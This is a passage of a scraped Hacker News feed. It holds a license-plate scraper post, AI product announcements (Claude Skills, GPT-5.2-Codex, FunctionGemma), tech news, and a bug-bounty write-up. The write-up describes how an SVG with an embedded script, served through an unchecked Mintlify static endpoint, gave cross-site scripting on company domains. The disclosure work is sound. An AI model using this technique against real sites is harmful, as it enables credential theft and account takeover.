    &lt;quote&gt;function buildFormData(plates: string[],viewState: string,viewStateGenerator: string,eventValidation: string): string {const params = new URLSearchParams();params.append("__VIEWSTATE", viewState);params.append("__VIEWSTATEGENERATOR", viewStateGenerator);params.append("__EVENTVALIDATION", eventValidation);const fieldNames = ["ctl00$MainContent$txtInputRowOne","ctl00$MainContent$txtInputRowTwo","ctl00$MainContent$txtInputRowThree","ctl00$MainContent$txtInputRowFour","ctl00$MainContent$txtInputRowFive",];for (let i = 0; i &amp;lt; 5; i++) {params.append(fieldNames[i],i &amp;lt; plates.length ? plates[i].toUpperCase() : "");}params.append("ctl00$MainContent$btnSubmit", "Submit");return params.toString();}&lt;/quote&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Submit the POST request and parse the body! Thankfully, the site returned a big ol' &lt;code&gt;AVAILABLE&lt;/code&gt;or&lt;code&gt;NOT AVAILABLE&lt;/code&gt;for each plate combo, so that was easy enough to check in code:&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;function extractPlateStatuses(html: string,plates: string[]): PlateCheckResult[] {const results: PlateCheckResult[] = [];const labelIds = ["MainContent_lblOutPutRowOne","MainContent_lblOutPutRowTwo","MainContent_lblOutputRowThree","MainContent_lblOutputRowFour","MainContent_lblOutputRowFive",];for (let i = 0; i &amp;lt; plates.length; i++) {const labelId = labelIds[i];const regex = new RegExp(`id="${labelId}"[^&amp;gt;]*&amp;gt;([^&amp;lt;]*)&amp;lt;`, "i");const match = html.match(regex);const status = match ? match[1].trim() : "";const available = status.toUpperCase() === "AVAILABLE";results.push({plate: plates[i],available,status: status || "UNKNOWN",});}return results;}&lt;/quote&gt;
    &lt;head rend="h2"&gt;The Plate War of '25&lt;/head&gt;
    &lt;p&gt;Once the script was running smoothly, I created a small microservice that added the results to a Postgres database with the plate combination, along with the last time it was checked. For smaller, high-value combinations (eg, any of the single letter / double letter combinations), I constantly polled every hour or two to check availability. What I didn't realize at the time was the system updated in real time. The moment someone reserved a plate, the Florida DMV's backend reflected the change on the next lookup.&lt;/p&gt;
    &lt;p&gt;To visualize the data I had scraped, I built a quick Next.js frontend that let me browse through results, filter combinations, and batch-upload plate lists from a text file for quick checking.&lt;/p&gt;
    &lt;p&gt;I found some really cool plate combinations, like &lt;code&gt;WEBSITE&lt;/code&gt;, &lt;code&gt;SITE&lt;/code&gt;, and &lt;code&gt;CAPTCHA&lt;/code&gt; . But nothing compared to the spotting one of the only remaining two-letter combination I had seen during my search: &lt;code&gt;EO&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;I saw that &lt;code&gt;EO&lt;/code&gt; was available on November 26th. With Thanksgiving, Black Friday, and the entire weekend shutting down state offices, I assumed I had plenty of time to stroll into the Tax Collector's office and grab it.&lt;/p&gt;
    &lt;p&gt;December 1st rolled around and I hopped in my car at 9:30am to head towards the tax collector's office. While driving, I got a notification from my service that &lt;code&gt;EO&lt;/code&gt; was no longer available. Someone had the same idea as me, and clearly must have arrived when their doors opened right at 8am. I turned the car around, defeated, and went home.&lt;/p&gt;
    &lt;p&gt;When I had gotten home, out of spite (and curiosity) I decided to re-run a full check on all two letter license plates.&lt;/p&gt;
    &lt;p&gt;Just like that, by some weird divine timing alignment, another two-letter combination had popped back into availability.&lt;/p&gt;
    &lt;p&gt;My wallowing quickly ended, and I got right back in my car and drove straight to the office. After almost an hour long wait (and a conversation with a slightly confused but very patient office clerk listening to my explanation), I was able to make the reservation. HY was officially my license plate.&lt;/p&gt;
    &lt;p&gt;I'd show you a picture, but unfortunately Florida runs on a 60-day delivery timeline for custom plates. Still: it exists, it's paid for, and it's proof that with a little TypeScript and an unreasonable amount of determination, you can claim just about anything.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.jack.bio/blog/licenseplate"/><published>2025-12-18T15:00:32+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46313991</id><title>Beginning January 2026, all ACM publications will be made open access</title><updated>2025-12-19T04:25:57.302949+00:00</updated><content/><link href="https://dl.acm.org/openaccess"/><published>2025-12-18T15:39:09+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46315414</id><title>Skills for organizations, partners, the ecosystem</title><updated>2025-12-19T04:25:56.949399+00:00</updated><content>&lt;doc fingerprint="dd141e2f0b27db6c"&gt;
  &lt;main&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;December 18, 2025&lt;/item&gt;
      &lt;item&gt;5min&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In October, we introduced skillsâa way to teach Claude repeatable workflows tailored to how you work. Today we're making skills easier to deploy, discover, and build: organization-wide management for admins; a directory of partner-built skills from Notion, Canva, Figma, Atlassian, and others; and an open standard so skills work across AI platforms.&lt;/p&gt;
    &lt;head rend="h2"&gt;Manage skills across your organization&lt;/head&gt;
    &lt;p&gt;Claude Team and Enterprise plan admins can now provision skills centrally from admin settings. Admin-provisioned skills are enabled by default for all users. Users can still toggle individual skills off if they choose. This gives organizations consistent, approved workflows across teams while letting individual users customize their experience.&lt;/p&gt;
    &lt;head rend="h2"&gt;Discover, create, and edit new skills&lt;/head&gt;
    &lt;p&gt;Creating skills is now simpler. Describe what you want and Claude helps build it, or write instructions directly. For complex workflows, upload skill folders or use the skill-creator. Claude can also help you edit existing skills, and new previews show full contents so you can understand exactly what a skill does before enabling it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Skills directory&lt;/head&gt;
    &lt;p&gt;A growing collection of partner-built skills is now available at claude.com/connectors.&lt;/p&gt;
    &lt;p&gt;Admins can provision these partner skills across their organization, giving teams immediate access to workflows for tools they already use without any custom development.&lt;/p&gt;
    &lt;head rend="h2"&gt;An open standard&lt;/head&gt;
    &lt;p&gt;We're also publishingÂ Agent Skills as an open standard. Like MCP, we believe skills should be portable across tools and platformsâthe same skill should work whether you're using Claude or other AI platforms. We've been collaborating with members of the ecosystem, and we're excited to see early adoption of the standard.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting started&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Claude Apps: Browse the skills directory and enable in Settings &amp;gt; Capabilities &amp;gt; Skills.&lt;/item&gt;
      &lt;item&gt;Claude Code: Install from the plugin directory or check skills into your repository.&lt;/item&gt;
      &lt;item&gt;Claude Developer Platform (API): Use skills via the /v1/skills endpoint. See documentation.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Admins can provision skills org-wide through Admin Settings. Skills require Code Execution and File Creation to be enabled.&lt;/p&gt;
    &lt;head rend="h2"&gt;Transform how your organization operates with Claude&lt;/head&gt;
    &lt;p&gt;Get the developer newsletter&lt;/p&gt;
    &lt;p&gt;Product updates, how-tos, community spotlights, and more. Delivered monthly to your inbox.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://claude.com/blog/organization-skills-and-directory"/><published>2025-12-18T17:04:32+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46316367</id><title>GPT-5.2-Codex</title><updated>2025-12-19T04:25:56.732402+00:00</updated><content>&lt;doc fingerprint="3f4b6dffd47fc68d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing GPT-5.2-Codex&lt;/head&gt;
    &lt;p&gt;The most advanced agentic coding model for professional software engineering and defensive cybersecurity.&lt;/p&gt;
    &lt;p&gt;Today we’re releasing GPT‑5.2-Codex, the most advanced agentic coding model yet for complex, real-world software engineering. GPT‑5.2-Codex is a version of GPT‑5.2 further optimized for agentic coding in Codex, including improvements on long-horizon work through context compaction, stronger performance on large code changes like refactors and migrations, improved performance in Windows environments, and significantly stronger cybersecurity capabilities.&lt;/p&gt;
    &lt;p&gt;As our models continue to advance along the intelligence frontier, we’ve observed that these improvements also translate to capability jumps in specialized domains such as cybersecurity. For example, just last week, a security researcher using GPT‑5.1-Codex-Max with Codex CLI found and responsibly disclosed(opens in a new window) a vulnerability in React that could lead to source code exposure.&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex has stronger cybersecurity capabilities than any model we’ve released so far. These advances can help strengthen cybersecurity at scale, but they also raise new dual-use risks that require careful deployment. While GPT‑5.2-Codex does not reach a ‘High’ level of cyber capability under our Preparedness Framework, we’re designing our deployment approach with future capability growth in mind.&lt;/p&gt;
    &lt;p&gt;We're releasing GPT‑5.2-Codex today in all Codex surfaces for paid ChatGPT users, and working towards safely enabling access to GPT‑5.2-Codex for API users in the coming weeks. In parallel, we’re piloting invite-only trusted access to upcoming capabilities and more permissive models for vetted professionals and organizations focused on defensive cybersecurity work. We believe that this approach to deployment will balance accessibility with safety.&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex builds on GPT‑5.2’s strengths in professional knowledge work and GPT‑5.1-Codex-Max’s frontier agentic coding and terminal-using capabilities. GPT‑5.2-Codex is now better at long-context understanding, reliable tool calling, improved factuality, and native compaction, making it a more dependable partner for long running coding tasks, while remaining token-efficient in its reasoning.&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex achieves state-of-the-art performance on SWE-Bench Pro and Terminal-Bench 2.0, benchmarks designed to test agentic performance on a wide variety of tasks in realistic terminal environments. It is also much more effective and reliable at agentic coding in native Windows environments, building on capabilities introduced in GPT‑5.1-Codex-Max.&lt;/p&gt;
    &lt;p&gt;With these improvements, Codex is more capable at working in large repositories over extended sessions with full context intact. It can more reliably complete complex tasks like large refactors, code migrations, and feature builds — continuing to iterate without losing track, even when plans change or attempts fail.&lt;/p&gt;
    &lt;p&gt;Stronger vision performance enables GPT‑5.2-Codex to more accurately interpret screenshots, technical diagrams, charts, and UI surfaces shared during coding sessions.&lt;/p&gt;
    &lt;p&gt;Codex can take design mocks and quickly translate them to functional prototypes, and you can pair with Codex to take these prototypes to production.&lt;/p&gt;
    &lt;head rend="h5"&gt;Design mock&lt;/head&gt;
    &lt;head rend="h5"&gt;Prototype generated by GPT-5.2-Codex&lt;/head&gt;
    &lt;p&gt;When charting performance on one of our core cybersecurity evaluations over time, we see a sharp jump in capability starting with GPT‑5-Codex, another large jump with GPT‑5.1-Codex-Max and now a third jump with GPT‑5.2-Codex. We expect that upcoming AI models will continue on this trajectory. In preparation, we are planning and evaluating as though each new model could reach ‘High’ levels of cybersecurity capability, as measured by our Preparedness Framework(opens in a new window). While GPT‑5.2-Codex has not yet reached ‘High’ level of cyber capability, we are preparing for future models that cross that threshold. Due to the increased cyber capabilities, we have added additional safeguards in the model and in the product, which are outlined in the system card.&lt;/p&gt;
    &lt;p&gt;Modern society runs on software, and its reliability depends on strong cybersecurity—keeping critical systems in banking, healthcare, communications, and essential services online, protecting sensitive data, and ensuring people can trust the software they rely on every day. Vulnerabilities can exist long before anyone knows about them, and finding, validating, and fixing them often depends on a community of engineers and independent security researchers equipped with the right tools.&lt;/p&gt;
    &lt;p&gt;On December 11, 2025, the React team published three security vulnerabilities affecting apps built with React Server Components. What made this disclosure notable was not only the vulnerabilities themselves, but how they were uncovered.&lt;/p&gt;
    &lt;p&gt;Andrew MacPherson, a principal security engineer at Privy (a Stripe company), was using GPT‑5.1-Codex-Max with Codex CLI and other coding agents to reproduce and study a different critical React vulnerability disclosed the week prior, known as React2Shell(opens in a new window) (CVE-2025-55182(opens in a new window)). His goal was to evaluate how well the model could assist with real-world vulnerability research.&lt;/p&gt;
    &lt;p&gt;He initially attempted several zero-shot analyses, prompting the model to examine the patch and identify the vulnerability it addressed. When that did not yield results, he shifted to a higher-volume, iterative prompting approach. When those approaches did not succeed, he guided Codex through standard defensive security workflows—setting up a local test environment, reasoning through potential attack surfaces, and using fuzzing to probe the system with malformed inputs. While attempting to reproduce the original React2Shell issue, Codex surfaced unexpected behaviors that warranted deeper investigation. Over the course of a single week, this process led to the discovery of previously unknown vulnerabilities, which were responsibly disclosed to the React team.&lt;/p&gt;
    &lt;p&gt;This demonstrates how advanced AI systems can materially accelerate defensive security work in widely used, real-world software. At the same time, capabilities that help defenders move faster can also be misused by bad actors.&lt;/p&gt;
    &lt;p&gt;As agentic systems become more capable in cybersecurity-relevant tasks, we are making it a core priority to ensure these advances are deployed responsibly—pairing every gain in capability with stronger safeguards, tighter access controls, and ongoing collaboration with the security community.&lt;/p&gt;
    &lt;p&gt;Security teams can run into restrictions when attempting to emulate threat actors, analyze malware to support remediation, or stress test critical infrastructure. We are developing a trusted access pilot to remove that friction for qualifying users and organizations and enable trusted defenders to use frontier AI cyber capabilities to accelerate cyberdefense.&lt;/p&gt;
    &lt;p&gt;Initially the pilot program will be invite-only for vetted security professionals with a track record of responsible vulnerability disclosure and organizations with a clear professional cybersecurity use case. Qualifying participants will get access to our most capable models for defensive use-cases to enable legitimate dual-use work.&lt;/p&gt;
    &lt;p&gt;If you’re a security professional or part of an organization doing ethical security work like vulnerability research or authorized red-teaming, we invite you to express interest in joining and share feedback on what you’d like to see from the program here(opens in a new window).&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex represents a step forward in how advanced AI can support real-world software engineering and specialized domains like cybersecurity—helping developers and defenders tackle complex, long-horizon work, and strengthening the tools available for responsible security research.&lt;/p&gt;
    &lt;p&gt;By rolling GPT‑5.2-Codex out gradually, pairing deployment with safeguards, and working closely with the security community, we’re aiming to maximize defensive impact while reducing the risk of misuse. What we learn from this release will directly inform how we expand access over time as the software and cyber frontiers continue to advance.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://openai.com/index/introducing-gpt-5-2-codex/"/><published>2025-12-18T18:14:48+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46316409</id><title>Firefox will have an option to disable all AI features</title><updated>2025-12-19T04:25:56.127735+00:00</updated><content>&lt;doc fingerprint="f8eb8f2f2d953eed"&gt;
  &lt;main&gt;
    &lt;p&gt;To use the Mastodon web application, please enable JavaScript. Alternatively, try one of the native apps for Mastodon for your platform.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://mastodon.social/@firefoxwebdevs/115740500373677782"/><published>2025-12-18T18:18:30+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46316533</id><title>FunctionGemma 270M Model</title><updated>2025-12-19T04:25:55.905581+00:00</updated><content>&lt;doc fingerprint="9dd7ecd2c69883e3"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;FunctionGemma: Bringing bespoke function calling to the edge&lt;/head&gt;
    &lt;p&gt;It has been a transformative year for the Gemma family of models. In 2025, we have grown from 100 million to over 300 million downloads while demonstrating the transformative potential of open models, from defining state-of-the-art single-accelerator performance with Gemma 3 to advancing cancer research through the C2S Scale initiative.&lt;/p&gt;
    &lt;p&gt;Since launching the Gemma 3 270M model, the number one request we’ve received from developers is for native function calling capabilities. We listened, recognizing that as the industry shifts from purely conversational interfaces to active agents, models need to do more than just talk — they need to act. This is particularly compelling on-device, where agents can automate complex, multi-step workflows, from setting reminders to toggling system settings. To enable this at the edge, models must be lightweight enough to run locally and specialized enough to be reliable.&lt;/p&gt;
    &lt;p&gt;Today, we are releasing FunctionGemma, a specialized version of our Gemma 3 270M model tuned for function calling. It is designed as a strong base for further training into custom, fast, private, local agents that translate natural language into executable API actions.&lt;/p&gt;
    &lt;p&gt;FunctionGemma acts as a fully independent agent for private, offline tasks, or as an intelligent traffic controller for larger connected systems. In this role, it can handle common commands instantly at the edge, while routing more complex tasks to models like Gemma 3 27B.&lt;/p&gt;
    &lt;head rend="h3"&gt;What makes FunctionGemma unique&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Unified action and chat: FunctionGemma knows how to talk to both computers and humans. It can generate structured function calls to execute tools, then switch context to summarize the results in natural language for the user.&lt;/item&gt;
      &lt;item&gt;Built for customization: FunctionGemma is designed to be molded, not just prompted. In our "Mobile Actions" evaluation, fine-tuning transformed the model’s reliability, boosting accuracy from a 58% baseline to 85%. This confirms that for edge agents, a dedicated, trained specialist is an efficient path to production-grade performance.&lt;/item&gt;
      &lt;item&gt;Engineered for the edge: Small enough to run on edge devices like the NVIDIA Jetson Nano and mobile phones, the model uses Gemma’s 256k vocabulary to efficiently tokenize JSON and multilingual inputs. This makes it a strong base for fine-tuning in specific domains, reducing sequence length to ensure minimum latency and total user privacy.&lt;/item&gt;
      &lt;item&gt;Broad ecosystem support: The model is supported by popular tools across the entire workflow: fine-tune with Hugging Face Transformers, Unsloth, Keras or NVIDIA NeMo and deploy using LiteRT-LM, vLLM, MLX, Llama.cpp, Ollama, Vertex AI or LM Studio.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;FunctionGemma accuracy on Mobile Actions dataset before and after fine-tuning on a held out eval set.&lt;/p&gt;
    &lt;head rend="h2"&gt;When to choose FunctionGemma&lt;/head&gt;
    &lt;p&gt;FunctionGemma is the bridge between natural language and software execution. It is the right tool if:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;You have a defined API surface: Your application has a defined set of actions (e.g., smart home, media, navigation).&lt;/item&gt;
      &lt;item&gt;You are ready to fine-tune: You need the consistent, deterministic behavior that comes from fine-tuning on specific data, rather than the variability of zero-shot prompting.&lt;/item&gt;
      &lt;item&gt;You prioritize local-first deployment: Your application requires near-instant latency and total data privacy, running efficiently within the compute and battery limits of edge devices.&lt;/item&gt;
      &lt;item&gt;You are building compound systems: You need a lightweight edge model to handle local actions, allowing your system to process common commands on-device and only query larger models (like Gemma 3 27B) for more complex tasks.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;How to see it in action&lt;/head&gt;
    &lt;p&gt;Let's look at how these models transform actual user experiences. You can explore these capabilities in the Google AI Edge Gallery app through two distinct experiences: an interactive game and a developer challenge.&lt;/p&gt;
    &lt;head rend="h3"&gt;Mobile Actions fine tuning&lt;/head&gt;
    &lt;p&gt;This demo reimagines assistant interaction as a fully offline capability. Whether it’s "Create a calendar event for lunch tomorrow," "Add John to my contacts" or "Turn on the flashlight," the model parses the natural language and identifies the correct OS tool to execute the command. To unlock this agent, developers are invited to use our fine-tuning cookbook to build the model and load it onto their mobile device.&lt;/p&gt;
    &lt;head rend="h3"&gt;TinyGarden game demo&lt;/head&gt;
    &lt;p&gt;In this interactive mini-game, players use voice commands to manage a virtual plot of land. You might say, "Plant sunflowers in the top row and water them," and the model decomposes this into specific app functions like plantCrop or waterCrop targeting specific grid coordinates. This proves that a 270M model can handle multi-turn logic to drive custom game mechanics, on a mobile phone, without ever pinging a server.&lt;/p&gt;
    &lt;head rend="h3"&gt;FunctionGemma Physics Playground&lt;/head&gt;
    &lt;p&gt;Use natural language to solve fun physics simulation puzzles in a game that runs 100% locally in your browser, powered by FunctionGemma and Transformers.js!&lt;/p&gt;
    &lt;p&gt;Credit: @xenovacom on X&lt;/p&gt;
    &lt;head rend="h2"&gt;How to try FunctionGemma today&lt;/head&gt;
    &lt;p&gt;We are moving from an era of chatbots to an era of action. With FunctionGemma, that power now fits in your pocket.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Download: Get the model on Hugging Face or Kaggle.&lt;/item&gt;
      &lt;item&gt;Learn: Check out the guides on function calling templates, how to sequence the model with function responses and fine-tuning.&lt;/item&gt;
      &lt;item&gt;Explore: Download the updated Google AI Edge Gallery to try the demos.&lt;/item&gt;
      &lt;item&gt;Build: Access the Mobile Actions guide with a Colab notebook and dataset to train your own specialized agent.&lt;/item&gt;
      &lt;item&gt;Deploy: Easily publish your own models onto mobile devices using LiteRT-LM or use alongside larger models on Vertex AI or NVIDIA devices like RTX PRO and DGX Spark.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We can’t wait to see the unique, private, and ultra-fast experiences you unlock on-device.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.google/technology/developers/functiongemma/"/><published>2025-12-18T18:26:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46316907</id><title>How China built its ‘Manhattan Project’ to rival the West in AI chips</title><updated>2025-12-19T04:25:54.872181+00:00</updated><content>&lt;doc fingerprint="ffc334920e9cd3af"&gt;
  &lt;main&gt;
    &lt;p&gt;In a high-security Shenzhen laboratory, Chinese scientists have built what Washington has spent years trying to prevent: a prototype of a machine capable of producing the cutting-edge semiconductor chips that power artificial intelligence, smartphones and weapons central to Western military dominance.&lt;/p&gt;
    &lt;p&gt;Completed in early 2025 and now undergoing testing, the prototype fills nearly an entire factory floor. It was built by a team of former engineers from Dutch semiconductor giant ASML who reverse-engineered the company’s extreme ultraviolet lithography machines (EUVs), according to two people with knowledge of the project.&lt;/p&gt;
    &lt;p&gt;EUV machines sit at the heart of a technological Cold War. They use beams of extreme ultraviolet light to etch circuits thousands of times thinner than a human hair onto silicon wafers, currently a capability monopolized by the West. The smaller the circuits, the more powerful the chips.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.japantimes.co.jp/business/2025/12/18/tech/china-west-ai-chips/"/><published>2025-12-18T18:55:34+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46317098</id><title>We pwned X, Vercel, Cursor, and Discord through a supply-chain attack</title><updated>2025-12-19T04:25:53.406497+00:00</updated><content>&lt;doc fingerprint="b4b0b02b285796c6"&gt;
  &lt;main&gt;
    &lt;p&gt;hi, i'm daniel. i'm a 16-year-old high school senior. in my free time, i hack billion dollar companies and build cool stuff.&lt;/p&gt;
    &lt;p&gt;about a month ago, a couple of friends and I found serious critical vulnerabilities on Mintlify, an AI documentation platform used by some of the top companies in the world.&lt;/p&gt;
    &lt;p&gt;i found a critical cross-site scripting vulnerability that, if abused, would let an attacker to inject malicious scripts into the documentation of numerous companies and steal credentials from users with a single link open.&lt;/p&gt;
    &lt;p&gt;(go read my friends' writeups (after this one)) &lt;lb/&gt; how to hack discord, vercel, and more with one easy trick (eva) &lt;lb/&gt; Redacted by Counsel: A supply chain postmortem (MDL)&lt;/p&gt;
    &lt;p&gt;here's my story...&lt;/p&gt;
    &lt;p&gt;My story begins on Friday, November 7, 2025, when Discord announced a brand new update to their developer documentation platform. They were previously using a custom built documentation platform, but were switching to an AI-powered documentation platform.&lt;/p&gt;
    &lt;p&gt;Discord is one of my favorite places to hunt for vulnerabilities since I'm very familiar with their API and platform. I'm at the top of their bug bounty leaderboard having reported nearly 100 vulnerabilities over the last few years. After you've gone through every feature at least 10 times, it gets boring.&lt;/p&gt;
    &lt;p&gt;I found this new update exciting, and as soon as I saw the announcement, I started looking through how they implemented this new documentation platform.&lt;/p&gt;
    &lt;p&gt;Mintlify is an AI-powered documentation platform. You write your documentation as markdown and Mintlify turns it into a beautiful documentation platform with all the modern features a documentation platform needs. (Despite the vulnerabilities we found, I would highly recommend them. They make it really easy to create beautiful docs that work.)&lt;/p&gt;
    &lt;p&gt;Mintlify-hosted documentation sites are on the *.mintlify.app domains, with support for custom domains. In Discord's case, they were just proxying certain routes to their Mintlify documentation at &lt;code&gt;discord.mintlify.app&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Every Mintlify subdomain has a &lt;code&gt;/_mintlify/*&lt;/code&gt; path that is used internally on the platform to power certain features. Regardless of whether it's hosted through the &lt;code&gt;mintlify.app&lt;/code&gt; domain or a custom domain, the &lt;code&gt;/_mintlify&lt;/code&gt; path must be accessible to power the documentation.
&lt;/p&gt;
    &lt;p&gt;(For example, the &lt;code&gt;/api/user&lt;/code&gt; path for authentication: https://docs.x.com/_mintlify/api/user, https://discord.com/_mintlify/api/user, etc)&lt;/p&gt;
    &lt;p&gt;After Discord switched to Mintlify and when I started looking for bugs on the platform, from the get-go, my plan was to find a way to render another Mintlify documentation through Discord's domain.&lt;/p&gt;
    &lt;p&gt;At first, I tried path traversal attacks, but they didn't work. Then, I started looking through the &lt;code&gt;/_mintlify&lt;/code&gt; API endpoints.&lt;/p&gt;
    &lt;p&gt;Using Chrome DevTools to search the assets, I found the endpoint &lt;code&gt;/_mintlify/_markdown/_sites/[subdomain]/[...route]&lt;/code&gt;. It accepted any Mintlify documentation (&lt;code&gt;[subdomain]&lt;/code&gt;) and it returned a file from that specific documentation (&lt;code&gt;[...route]&lt;/code&gt;). The endpoint didn't check to make sure the &lt;code&gt;[subdomain]&lt;/code&gt; matched with the current host, which means you could fetch files from any Mintlify documentation on an host with the &lt;code&gt;/_mintlify/&lt;/code&gt; route.&lt;/p&gt;
    &lt;p&gt;Unfortunately, this endpoint only returned raw markdown text. The markdown wasn't rendered as HTML, meaning it was impossible to run code. I spent the rest of the time trying different ways to bypass this, but nothing worked.&lt;/p&gt;
    &lt;p&gt;Fast forward 2 days to Sunday, November 9, 2025, I went back to hunting.&lt;/p&gt;
    &lt;p&gt;I was confident there was another endpoint, like the markdown one, which could fetch and return cross-site data, but I couldn't find one. I tried searching web assets and some other techniques, but I couldn't find the endpoint I was looking for.&lt;/p&gt;
    &lt;p&gt;Finally, I decided to look through the Mintlify CLI. Mintlify lets you run your documentation site locally via their npm package (@mintlify/cli). I realized that this probably meant the code powering the documentation platform was somewhat public.&lt;/p&gt;
    &lt;p&gt;After digging through the package and downloading tarballs linked in the code, I found myself at exactly what I was looking for.&lt;/p&gt;
    &lt;p&gt;Jackpot!&lt;/p&gt;
    &lt;p&gt;This was a list of application endpoints (compiled by Nextjs), and in the middle, there's the endpoint &lt;code&gt;/_mintlify/static/[subdomain]/[...route]&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Like the markdown endpoint, this endpoint accepted any Mintlify documentation (&lt;code&gt;[subdomain]&lt;/code&gt;). The only difference was this endpoint returned static files from the documentation repo.&lt;/p&gt;
    &lt;p&gt;First, I tried accessing HTML and JavaScript files but it didn't work; I realized there was some sort of whitelist of file extensions. Then, I tried an SVG file, and it worked.&lt;/p&gt;
    &lt;p&gt;If you didn't know, you can embed JavaScript into an SVG file. The script doesn't run unless the file is directly opened (you can't run scripts from (&lt;code&gt;&amp;lt;img src="/image.svg"&amp;gt;&lt;/code&gt;). This is very common knowledge for security researchers.&lt;/p&gt;
    &lt;p&gt;I created an SVG file with an embedded script, uploaded it to my Mintlify documentation, and opened the endpoint through Discord (https://discord.com/_mintlify/_static/hackerone-a00f3c6c/lmao.svg). It worked!&lt;/p&gt;
    &lt;p&gt;XSS attacks are incredibly rare on Discord, so I shared it with a couple friends.&lt;/p&gt;
    &lt;p&gt;I sent a screenshot to xyzeva, only to find out she had also been looking into Mintlify after the Discord switch. She had previously discovered other vulnerabilities on the Mintlify platform, and had found more that she was preparing to disclose (go read her writeup!). I find it funny we had both separately been looking into Mintlify and found very different, but very critical bugs.&lt;/p&gt;
    &lt;p&gt;Another friend joined, and we created a group chat.&lt;/p&gt;
    &lt;p&gt;We reported the vulnerability to Discord and attempted to contact Mintlify through an employee.&lt;/p&gt;
    &lt;p&gt;Discord took this very seriously, and closed off its entire developer documentation for 2 hours while investigating the impact of this vulnerability. Then, they reverted to their old documentation platform and removed all the Mintlify routes. https://discordstatus.com/incidents/by04x5gnnng3&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt; Mintlify contacted us directly very shortly after hearing about the vulnerability through Discord. We set up a Slack channel with Mintlify's engineering team and got to work. Personally, this cross-site scripting attack was the only thing I had the time to find; eva and MDL worked with Mintlify's engineering team to quickly remediate this and other vulnerabilities they found on the platform.&lt;/p&gt;
    &lt;p&gt;In total, the cross-site scripting attack affected almost every Mintlify customer. To name a few: X (Twitter), Vercel, Cursor, Discord, and more.&lt;/p&gt;
    &lt;p&gt;These customers host their documentation on their primary domains and were vulnerable to account takeovers with a single malicious link.&lt;/p&gt;
    &lt;p&gt;Fortunately, we responsibly found and disclosed this vulnerability but this is an example of how compromising a single supply chain can lead to a multitude of problems.&lt;/p&gt;
    &lt;p&gt;In total, we collectively recieved ~$11,000 in bounties. Discord paid $4,000 and Mintlify individually gave us bounties for the impact of the bugs we individually found.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28"/><published>2025-12-18T19:08:48+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46317174</id><title>The Scottish Highlands, the Appalachians, Atlas are the same mountain range</title><updated>2025-12-19T04:25:52.666294+00:00</updated><content>&lt;doc fingerprint="edddc0dbd95864a5"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The Scottish Highlands, the Appalachians, and the Atlas are the same mountain range, once connected as the Central Pangean Mountains&lt;/head&gt;
    &lt;p&gt;The Central Pangean Mountains were a great mountain chain in the middle part of the supercontinent Pangaea that stretches across the continent from northeast to southwest during the Carboniferous, Permian Triassic periods. The ridge was formed as a consequence of a collision between the supercontinents Laurussia and Gondwana during the formation of Pangaea. It was similar to the present Himalayas at its highest elevation during the beginning of the Permian period.&lt;/p&gt;
    &lt;p&gt;It’s hard to imagine now that once upon a time that the Scottish Highlands, the Appalachians, the Ouachita Mountains, and the Little Atlas of Morocco are the same mountain range, once connected as the Central Pangean Mountains.&lt;/p&gt;
    &lt;p&gt;During the Permian period, the Central Pangean were subjected to significant physical weathering, decreasing the peaks and forming many deep intermontane plains. By the Middle Triassic, the mountain sierras had been considerably reduced in size. By the beginning of the Jurassic period (200 mln years ago), the Pangean chain in Western Europe disappeared to some highland regions separated by deep marine basins.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://vividmaps.com/central-pangean-mountains/"/><published>2025-12-18T19:15:17+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46317546</id><title>How to hack Discord, Vercel and more with one easy trick</title><updated>2025-12-19T04:25:52.268251+00:00</updated><content>&lt;doc fingerprint="b461b8d9682777c9"&gt;
